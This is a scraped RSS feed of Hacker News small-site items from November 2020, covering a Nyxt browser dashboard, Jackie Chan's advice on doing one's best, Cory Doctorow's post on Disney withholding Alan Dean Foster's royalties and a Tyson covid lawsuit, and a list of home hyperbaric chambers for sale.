<p><img src="https://nyxt.atlas.engineer/static/image/article/dashboard.png"></p>
<p>The dashboard in Nyxt can be configured to show any available system information, processes running, disk space available, the weather, etc. If the information is available, the dashboard can display it.</p>

<p>Use the following snippet within your configuration file to enable the built-in dashboard:</p>

<p>If you wish to specify a different dashboard function (for example, a function of your own making), pass a different function to <code>make-startup-function</code>.</p>
<p>In creating a new dashboard function, you'll be able to produce any layout/information you wish- that is how you can completely customize the dashboard.</p>

<p>The built-in dashboard uses an internal buffer. Therefore, to change its appearance, you can change the <code>style</code> of the <code>internal-buffer</code> class. Changing this will effect all of your interal buffers (examples include: bookmark listing, buffer listing, message listing, help pages, etc)- resulting in an easily configurable, consistent style.</p>
<p>In doing so you can make Nyxt look exactly how you want!</p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/dashboard-dark.png"></p>
<p>Thanks for reading :-)</p>


</div></div>]]>
            </description>
            <link>https://nyxt.atlas.engineer/article/dashboard.org</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151976</guid>
            <pubDate>Thu, 19 Nov 2020 17:36:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jackie Chan's Best Advice]]>
            </title>
            <description>
<![CDATA[
Score 81 | Comments 53 (<a href="https://news.ycombinator.com/item?id=25151667">thread link</a>) | @oDot
<br/>
November 19, 2020 | https://www.weedonandscott.com/blog/post/jackie-chan-best-advice/ | <a href="https://web.archive.org/web/*/https://www.weedonandscott.com/blog/post/jackie-chan-best-advice/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>
      
    
<p>
  <iframe src="https://www.youtube.com/embed/TqM1oX7Ckfc" allowfullscreen="" title="YouTube Video"></iframe>
</p>

<blockquote>
<p>Whatever you do, do the best you can, because the film live forever. “No, because, you know, that day raining and the actor don’t have time”. I said “Would you go to every theater to tell the audience?” No! The audience sit in the theater – “good movie”, “bad movie”. That’s all.</p>
</blockquote>
<p>I try to follow it with everything I do. With professional work – the software I create, the screenplays I write and the films I produce. With my personal life – how I talk to people, the things I buy and the cleanliness of my house.</p>
<p>To function, it must be implemented at every level. To do the best we can in software work, we must do the best we can with every line of code, email to a client and commit message. We will not clean our house the best we can unless we take care to pull out a toothbrush when needed, and even research the right toothbrush to have in our cleaning kit (don’t worry, any will do).</p>
<p>I can hear you already, “it’s too mentally tasking to do”. That line of thought is exactly what Jackie Chan advises us against. Even when the reservation is true, even when it’s raining and the actor doesn’t have time, we should ask ourselves “how can this be done despite the trouble”. Same thing goes for the advice itself. Instead of dismissing it on the account of mental load, one should ask “How can I apply this in my life anyway?”</p>
<p>Do no conflate “the best you can” with “perfect”. They are different things. “The best you can” refers to achieving goals. Goals usually combine all considerations, rather than the focus on an isolated metric of quality. The goal to have good breakfast will not be achieved the best you can if you eternally postpone it trying to perfect a french omelette.</p>
<p>Not any goal will do. Goals must adhere to high standards. That is why it can take Jackie Chan a year to film a movie. He takes the time needed to do the best he can, and still, he says, can see the imperfections when watching his own work. We should balance.</p>
<p>Yet it is true. Even though it’s somewhat of an “obvious” insight, it is very hard to put into practice. Around every corner hides a legitimate reason to do less.</p>
<p>We must remember that having reasons does not turn a failure to success. End results are completely unaffected by rationalization as to why they should or shouldn’t be the way they are.</p>
<p>An end result is just is.</p>



      
    </article>
    
    
      
      
</div></div>]]>
            </description>
            <link>https://www.weedonandscott.com/blog/post/jackie-chan-best-advice/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151667</guid>
            <pubDate>Thu, 19 Nov 2020 17:13:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[API data privacy and governance in the healthcare digital transformation]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151448">thread link</a>) | @apitracker
<br/>
November 19, 2020 | https://www.hoss.com/resource/2020-healthcare-whitepaper | <a href="https://web.archive.org/web/*/https://www.hoss.com/resource/2020-healthcare-whitepaper">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-component="container"><article><header><p><strong>Hoss</strong></p></header><figure><img src="https://www.hoss.com/assets/resources/healthcarewhitepaper.png"></figure><main data-post-content=""><p>New ways of using, managing and sharing important health data are triggering massive change across the entire continuum of healthcare. New technologies are creating better ways for providers to care for patients and for payers to reduce costs and leverage powerful analytics – whether it’s more effectively managing chronic illnesses by enabling real-time contact with doctors or seamlessly facilitating the flow of health information between coordinating parties. This digital transformation is happening quickly, and it is critical that healthcare organizations understand the trends driving this transformation and the challenges they bring to survive in the era of digital health.</p>
</main></article></div></div>]]>
            </description>
            <link>https://www.hoss.com/resource/2020-healthcare-whitepaper</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151448</guid>
            <pubDate>Thu, 19 Nov 2020 16:56:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The New Era of Developer Experience: Delivering World-Class Support]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25151420">thread link</a>) | @apitracker
<br/>
November 19, 2020 | https://www.hoss.com/resource/delivering-world-class-support-in-a-competitive-landscape | <a href="https://web.archive.org/web/*/https://www.hoss.com/resource/delivering-world-class-support-in-a-competitive-landscape">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>Download Now</strong><span>Enter your email address to download this Hoss resource.</span></p></div></div></div>]]>
            </description>
            <link>https://www.hoss.com/resource/delivering-world-class-support-in-a-competitive-landscape</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151420</guid>
            <pubDate>Thu, 19 Nov 2020 16:54:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Disney Stiffs SF Writer Alan Dean Foster]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25151408">thread link</a>) | @samizdis
<br/>
November 19, 2020 | https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay | <a href="https://web.archive.org/web/*/https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1606">
	<!-- .entry-header -->

	
	
	<div>
		<p><!--
Tags:
tyson, labor, covid, late-stage capitalism, guillotine watch, dearmickey, disneymustpay,alan dean foster, copyright, copyfight, chickenization, monopolies, contracts, sfwa, publishing, writing, disney, attack surface lectures, attack surface, science fiction, cyberpunk

Summary:
Cyberpunk and Post-Cyberpunk; Disney stiffs writer; Tyson execs bet on covid spread in unsafe plant

URL:
https://pluralistic.net/2020/11/19/disneymustpay/

Title:
Pluralistic: 19 Nov 2020 disneymustpay

Bullet:
🧛🏼‍♀️

Separator:
_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

Top Sources:
Today's top sources: JWZ (https://www.jwz.org/blog/).

--><br>
<a href="https://pluralistic.net/2020/11/19/disneymustpay/"><img src="https://i0.wp.com/craphound.com/images/19Nov2020.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/19Nov2020.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/19/disneymustpay/#asl">Cyberpunk and Post-Cyberpunk</a>: Bruce Sterling and Christopher Brown on the Attack Surface Lectures.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay">Disney stiffs writer</a>: Sure, what's new, but this is next-level fuckery #DisneyMustPay.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/19/disneymustpay/#you-bet-your-life">Tyson execs bet on covid spread in unsafe plant</a>: Upton Sinclair was an optimist.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/19/disneymustpay/#retro">This day in history</a>: 2010, 2015, 2019
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/19/disneymustpay/#bragsheet">Colophon</a>: Recent publications, upcoming appearances, current writing projects, current reading
</li>
</ul>

<hr>
<p><a name="asl"></a><br>
<img src="https://i0.wp.com/craphound.com/images/Doctorow-Attack-Surface-Tour-Graphics-Twitter.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/Doctorow-Attack-Surface-Tour-Graphics-Twitter.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Today on the Attack Surface Lectures (a series of 8 panels exploring themes from the third Little Brother book, hosted by Tor Books and 8 indie bookstores): Cyberpunk &amp; Post-Cyberpunk with Christopher Brown and Bruce Sterling, which Anderson's hosted on Oct 19.</p>
<p><a href="https://www.youtube.com/watch?v=xLlfrayuKAw">https://www.youtube.com/watch?v=xLlfrayuKAw</a></p>
<p>You can watch it without Youtube's surveillance courtesy of the Internet Archive:</p>
<p><a href="https://archive.org/details/asl-cyberpunk">https://archive.org/details/asl-cyberpunk</a></p>
<p>Or get the audio as an MP3:</p>
<p><a href="https://archive.org/download/asl-cyberpunk/Cyberpunk%20with%20Bruce%20Sterling%20and%20Christopher%20Brown.mp3">https://archive.org/download/asl-cyberpunk/Cyberpunk%20with%20Bruce%20Sterling%20and%20Christopher%20Brown.mp3</a></p>
<p>Earlier instalments in the series:</p>
<p>I. Politics and Protest (with Eva Galperin and Ron Deibert, hosted by The Strand):</p>
<p><a href="https://craphound.com/attacksurface/2020/11/16/the-attack-surface-lectures-politics-and-protest-fixed/">https://craphound.com/attacksurface/2020/11/16/the-attack-surface-lectures-politics-and-protest-fixed/</a></p>
<p>II. Cross-Media Sci-Fi (with Amber Benson and John Rogers, hosted by the Brookline Booksmith):</p>
<p><a href="https://craphound.com/attacksurface/2020/11/17/the-attack-surface-lectures-cross-media-sci-fi/">https://craphound.com/attacksurface/2020/11/17/the-attack-surface-lectures-cross-media-sci-fi/</a></p>
<p>III. Race, surveillance and tech (Meredith Whittaker and Malkia Devich-Cyril, hosted by The Booksmith):</p>
<p><a href="https://craphound.com/attacksurface/2020/11/18/the-attack-surface-lectures-intersectionality-race-surveillance-and-tech-and-its-history/">https://craphound.com/attacksurface/2020/11/18/the-attack-surface-lectures-intersectionality-race-surveillance-and-tech-and-its-history/</a></p>
<p>Here's a master post with all the media as it is goes live:</p>
<p><a href="https://craphound.com/news/2020/11/16/attack-surface-lectures-master-post/">https://craphound.com/news/2020/11/16/attack-surface-lectures-master-post/</a></p>
<p>And you can also get this as it's posted on my podcast feed – search for "Cory Doctorow podcast" in your podcatcher or use the RSS:</p>
<p><a href="https://feeds.feedburner.com/doctorow_podcast">https://feeds.feedburner.com/doctorow_podcast</a></p>
<hr>
<p><a name="disneymustpay"></a><br>
<img src="https://i0.wp.com/craphound.com/images/Disney-Must-Pay-Basic-Text-768x432.jpg?resize=768%2C432&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/Disney-Must-Pay-Basic-Text-768x432.jpg?resize=768%2C432&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Alan Dean Foster is an sf legend – a writer who produced a shelf of original novels but also made a reputation novelizing movies and TV from Star Wars to Aliens, turning out books that transcended quickie adaptations, becoming beloved bestsellers in their own right.</p>
<p>Disney now owns a bunch of these books, thanks to their acquisitions of Lucas and Fox, and these books continue to sell briskly. Disney not only isn't paying Foster any royalties for these books – they're refusing to even issue him royalty statements.</p>
<p><a href="https://www.sfwa.org/2020/11/18/disney-must-pay/">https://www.sfwa.org/2020/11/18/disney-must-pay/</a></p>
<p>Disney has blackholed Foster's agents and lawyers, and also the Science Fiction Writers of America (SFWA); to the extent that they have communicated with him, they have espoused a radical (jaw dropping) copyright theory.</p>
<p>This is Disney's theory: When they bought Lucas and Fox, they acquired the copyright licenses that enabled them to sell the Foster's books – but not the liability, the legal obligation to pay him for his books.</p>
<p>As SFWA president Mary Robinette Kowal says, this theory could absolutely upend the nature of copyright itself. Any publisher that wanted to go on making money from an author without paying them could simply sell the rights to a sister company, which then denies any obligations.</p>
<p>Foster brought his case to SFWA's grievance committee – a group that has worked on my behalf in the past, extracting a fee from a multinational publisher that commissioned and accepted a story from me but then offered an odious and unacceptable contract they refused to amend.</p>
<p>Usually griefcom work happens in the background: a SFWA member goes to griefcom, griefcom goes to the publisher, the publisher settles. This is the first time in more than a decade that SFWA has gone public with a complaint.</p>
<p>To be fair, Disney <em>did</em> offer to meet with Foster, but demanded that he sign an NDA <em>prior</em> to any negotiation. This is Not Normal. Sometimes the OUTCOME of a negotiation is confidential, but you don't go into a negotiation under NDA.</p>
<p>Disney appears to be taking a page from the cartoonish villain Scooter Braun, who refused to meet with Taylor Swift about buying back the rights to her masters without an NDA.</p>
<p><a href="https://twitter.com/taylorswift13/status/1328471874318311425">https://twitter.com/taylorswift13/status/1328471874318311425</a></p>
<p>Foster's case is a gross injustice. He has cancer and his wife is ill. He wrote these books, Disney bought them. They're making money from them. They owe him money. Period.</p>
<p>But beyond the individual injustice being visited upon Foster, Kowal and SFWA worry that this represents a suite of new, corporate anti-writer tactics: flipping assets without liabilities, refusing to talk about it without an NDA.</p>
<p>You can follow Foster's case with the #DisneyMustPay hashtag. If you're a writer facing similar tactics (even if you're not a SFWA member), they're seeking your story, via this form:</p>
<p><a href="https://airtable.com/shrr2S8rs4pcokske">https://airtable.com/shrr2S8rs4pcokske</a></p>
<hr>
<p><a name="you-bet-your-life"></a><br>
<img src="https://i0.wp.com/craphound.com/images/x1080.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/x1080.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Remember last April, when US meatpacking giants like Tyson were the epicenter of runaway superspreader events that slaughtered the poor, precarious, racialized workers who toiled under brutal and unsafe conditions?</p>
<p>One of the hardest-hit was Tyson's Waterloo, IA plant (the largest meat packing plant in America), where workers were denied PPE, forced to work without social distancing, and where more than 1,000 of them contracted covid. Many died.</p>
<p>One of the dead is Isidro Fernandez. In a wrongful death suit, his lawyers revealed details of Tyson's abuse of its workers that shock the conscience, like the fact that manager Tom Hart ran a betting pool on how many workers would contract covid.</p>
<p><a href="https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/">https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/</a></p>
<p>The suit also claims senior manager John Casey told supervisors that they were required to report for work even if they had symptoms, calling covid a "glorified flu." He forced a supervisor to cancel a testing appointment, saying "We all have symptoms – you have a job to do."</p>
<p>A worker who was so sick he vomited on the line was ordered back to work the next day.</p>
<p>As conditions in the plant deteriorated, Tyson managers stopped visiting the floor altogether in a bid to protect themselves. Instead, they delegated to inexperienced supervisors.</p>
<p>They also told workers they would only be eligible for a $500 "thank you bonus" if they reported for every shift they were scheduled to work, regardless of whether they were sick and contagious.</p>
<p>All of this was justified – by Tyson and its enablers in the GOP – as a necessary, regrettable part of keeping America fed during the lockdown. But Tyson's breakneck meat-packing wasn't primarily domestic: they were serving the Chinese market.</p>
<p>Chinese meat-packers had largely been mothballed to spare workers from the virus; as a result, the company was able to increase its exports to China by 600% during Q1-2020.</p>
<p>But this isn't the story that Tyson's execs told Governor Kim Reynolds when they lobbied for exemptions from liability for the employees they maimed and murdered during the same period – they claimed it was all patriotic zeal to feed America.</p>
<p>The case has moved to federal court, thanks to Trump's invocation of the Defense Production Act, which ordered Tyson to stay open during the lockdown.</p>
<hr>
<p><a name="retro"></a><br>
<img src="https://i0.wp.com/craphound.com/images/wayback-machine-hed-796x416.png?resize=796%2C416&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/wayback-machine-hed-796x416.png?resize=796%2C416&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>#10yrsago TSA confiscates heavily-armed soldiers’ nail-clippers <a href="https://redstate.com/erick/2010/11/18/another-tsa-outrage-n37064">https://redstate.com/erick/2010/11/18/another-tsa-outrage-n37064</a></p>
<p>#5yrsago Manhattan DA calls for backdoors in all mobile operating systems <a href="https://web.archive.org/web/20151120003032/https://www.manhattanda.org/sites/default/files/11.18.15%20Report%20on%20Smartphone%20Encryption%20and%20Public%20Safety.pdf">https://web.archive.org/web/20151120003032/https://www.manhattanda.org/sites/default/files/11.18.15%20Report%20on%20Smartphone%20Encryption%20and%20Public%20Safety.pdf</a></p>
<p>#1yrago Coop’s tribute to Randotti Skulls, from the golden age of Haunted Mansion merchandise <a href="https://memex.craphound.com/2019/11/18/coops-tribute-to-randotti-skulls-from-the-golden-age-of-haunted-mansion-merchandise/">https://memex.craphound.com/2019/11/18/coops-tribute-to-randotti-skulls-from-the-golden-age-of-haunted-mansion-merchandise/</a></p>
<hr>
<p><a name="bragsheet"></a><br>
<img src="https://i1.wp.com/craphound.com/images/colophonimages.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/colophonimages.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Today's top sources: JWZ (<a href="https://www.jwz.org/blog/">https://www.jwz.org/blog/</a>).</p>
<p>Currently writing: My next novel, "The Lost Cause," a post-GND novel about truth and reconciliation. Yesterday's progress: 513 words (85767 total).</p>
<p>Currently reading: The Ministry for the Future, Kim Stanley Robinson</p>
<p>Latest podcast: Someone Comes to Town, Someone Leaves Town (part 23) <a href="https://craphound.com/podcast/2020/11/16/someone-comes-to-town-someone-leaves-town-part-23/">https://craphound.com/podcast/2020/11/16/someone-comes-to-town-someone-leaves-town-part-23/</a></p>
<p>Upcoming appearances:</p>
<ul>
<li>Keynote, Cybersummit 2020, Nov 26 <a href="https://www.cybera.ca/cyber-summit-2020/">https://www.cybera.ca/cyber-summit-2020/</a>
</li>
<li>
<p>Keynote, Cologne Futures, Nov 27, details TBD</p>
</li>
<li>
<p>Beaverbrook Lecture: How to Destroy Surveillance Capitalism, Nov 30, <a href="https://www.mcgill.ca/maxbellschool/channels/event/2020-beaverbrook-annual-lecture-part-ii-cory-doctorow-325538">https://www.mcgill.ca/maxbellschool/channels/event/2020-beaverbrook-annual-lecture-part-ii-cory-doctorow-325538</a></p>
</li>
<li>
<p>Teach-In Against Surveillance, Dec 1, <a href="https://www.eventbrite.ca/e/teach-in-against-surveillance-tickets-128926228821">https://www.eventbrite.ca/e/teach-in-against-surveillance-tickets-128926228821</a></p>
</li>
<li>
<p>Keynote, NISO Plus, Feb 22-25, <a href="https://niso.plus/cory-doctorow-to-keynote-at-niso-plus-2021/">https://niso.plus/cory-doctorow-to-keynote-at-niso-plus-2021/</a></p>
</li>
</ul>
<p>Recent appearances:</p>
<ul>
<li>Fully Charged: The future of energy over the next 300 years<br>
<a href="https://fullycharged.show/podcasts/podcast-84-the-future-of-energy-over-the-next-300-years-cory-doctorow/">https://fullycharged.show/podcasts/podcast-84-the-future-of-energy-over-the-next-300-years-cory-doctorow/</a>
</li>
<li>
<p>Allen School Distinguished Lecture "Early Onset Oppenheimers"<br>
<a href="https://www.youtube.com/watch?v=Ep78A-jtcrE">https://www.youtube.com/watch?v=Ep78A-jtcrE</a></p>
</li>
<li>
<p>Author Stories Podcast<br>
<a href="https://www.youtube.com/watch?v=yxSPZn8EGTE">https://www.youtube.com/watch?v=yxSPZn8EGTE</a></p>
</li>
</ul>
<p>Latest book:</p>
<ul>
<li>"Attack Surface": The third Little Brother novel, a standalone technothriller for adults. The <em>Washington Post</em> called it "a political cyberthriller, vigorous, bold and savvy about the limits of revolution and resistance." Order signed, personalized copies from Dark Delicacies <a href="https://www.darkdel.com/store/p1840/Available_Now%3A_Attack_Surface.html">
</a></li><a href="https://www.darkdel.com/store/p1840/Available_Now%3A_Attack_Surface.html">
</a><li><a href="https://www.darkdel.com/store/p1840/Available_Now%3A_Attack_Surface.html">
</a><p><a href="https://www.darkdel.com/store/p1840/Available_Now%3A_Attack_Surface.html">"How to Destroy Surveillance Capitalism": an anti-monopoly pamphlet analyzing the true harms of surveillance capitalism and proposing a solution. </a><a href="https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59">https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59</a></p>
</li>
<li>
<p>"Little Brother/Homeland": A reissue omnibus edition with a new introduction by Edward Snowden: <a href="https://us.macmillan.com/books/9781250774583">https://us.macmillan.com/books/9781250774583</a>; personalized/signed copies here: <a href="https://www.darkdel.com/store/p1750/July%3A__Little_Brother_%26_Homeland.html">https://www.darkdel.com/store/p1750/July%3A__Little_Brother_%26_Homeland.html</a></p>
</li>
<li>
<p>"Poesy the Monster Slayer" a picture book about monsters, bedtime, gender, …</p></li></ul></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay">https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay</a></em></p>]]>
            </description>
            <link>https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151408</guid>
            <pubDate>Thu, 19 Nov 2020 16:53:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The 5 Best Home Hyperbaric Chambers Atlanta Hyperbaric Center]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151375">thread link</a>) | @evo_9
<br/>
November 19, 2020 | https://atlantahyperbariccenter.com/the-5-best-home-hyperbaric-chambers/ | <a href="https://web.archive.org/web/*/https://atlantahyperbariccenter.com/the-5-best-home-hyperbaric-chambers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"> <div> <div id="primary"> <main id="main"> <div data-elementor-type="single" data-elementor-id="353180" data-elementor-settings="[]"> <div> <section data-id="21fa3ea7" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">   </section> <section data-id="2eb24965" data-element_type="section"> <div> <div> <div data-id="5774b908" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"> <div> <div> <div data-id="15927d68" data-element_type="widget" data-widget_type="theme-post-featured-image.default"> <div> <p><img width="440" height="1024" alt="5 Best Home Hyperbaric Chambers" sizes="(max-width: 440px) 100vw, 440px" nitro-lazy-srcset="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers-.png 440w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--129x300.png 129w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--768x1788.png 768w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--660x1536.png 660w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--800x1863.png 800w" nitro-lazy-src="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--440x1024.png" nitro-lazy-empty="" id="MTQ2ODo4NTA=-1" src="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--440x1024.png" srcset="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers-.png 440w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--129x300.png 129w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--768x1788.png 768w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--660x1536.png 660w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--800x1863.png 800w"> </p> </div> </div> <div data-id="1813835f" data-element_type="widget" data-widget_type="theme-post-content.default"> <div>   <p>The 5 best home hyperbaric chambers aka mild hyperbaric chambers.&nbsp; With the popularity growing among home hyperbaric use.&nbsp; This guide will help you choose the best hyperbaric chamber for your home.&nbsp; All of the chambers are not rated is best to least but all 5 equally the only difference being price and shape.&nbsp; I have chose these chamber based on the needs of the customer and budget conscious.</p> <p><a href="https://atlantahyperbariccenter.com/wp-content/uploads/2019/07/thumbnail-6.jpeg"><img alt="Used Flexi Lite" width="1080" height="810" sizes="(max-width: 1080px) 100vw, 1080px" nitro-lazy-srcset="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6.jpeg 1080w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-300x225.jpeg 300w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-768x576.jpeg 768w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-1024x768.jpeg 1024w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-800x600.jpeg 800w" nitro-lazy-src="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6.jpeg" nitro-lazy-empty="" id="MTQ3ODo4MDg=-1" src="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6.jpeg" srcset="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6.jpeg 1080w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-300x225.jpeg 300w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-768x576.jpeg 768w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-1024x768.jpeg 1024w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/source/rev-6136258/wp-content/uploads/2019/07/thumbnail-6-800x600.jpeg 800w"></a></p> <p>If you are looking for a home oxygen chamber for your home give us a call. Owning your own chamber will save you time and money.</p>  <h2>The 5 best home hyperbaric chambers</h2>  <ol> <li><a href="https://atlantahyperbariccenter.com/26-shallow-dive-hyperbaric-chamber/"><strong>26″&nbsp; Hyperbaric chamber</strong> </a>– $3,800 This is the excellent entry chamber.&nbsp; 26″ diameter and 7′ long.&nbsp; It is whit bright and has two zippers and buckles for extra support.&nbsp; This chamber is perfect a single (person woman or small male). The chamber is one of the safest chambers with two open valves, two compressors, and surge alarm.</li> <li><a href="https://atlantahyperbariccenter.com/27-portable-hyperbaric-chamber/"><strong>27″ Hyperbaric Chamber</strong></a> – $3695 The another great entry level chamber.&nbsp; This chamber only comes with one pump but you can add another to your order with ease.&nbsp; This chamber is 27″&nbsp; diameter and around 7′ long.&nbsp; The chamber and a external frame, metal fixtures, think vinyl and three zippers.</li> 